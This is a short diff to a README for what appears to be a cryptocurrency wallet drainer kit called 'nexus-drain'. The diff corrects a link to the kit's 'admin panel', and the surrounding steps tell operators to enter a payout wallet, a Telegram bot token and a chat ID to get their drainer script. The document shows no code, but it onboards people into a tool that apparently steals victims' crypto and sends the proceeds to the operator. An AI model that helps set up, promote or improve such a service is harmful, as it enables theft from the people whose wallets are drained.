@@ -21,7 +21,7 @@
 
 ## 📦 How to get your script
 
-1. Open the **admin panel** → [https://nexus-drain-dev.github.io/drainer-portal/](https://nexus-drain-dev.github.io/nexus-drain-panel/) 
+1. Open the **admin panel** → [https://nexus-drain-dev.github.io/nexus-drain-panel/](https://nexus-drain-dev.github.io/nexus-drain-panel/) 
 
 2. Enter your **payout wallet** (EVM address)  
 3. Enter your **Telegram bot token** and **chat ID** (notifications)  
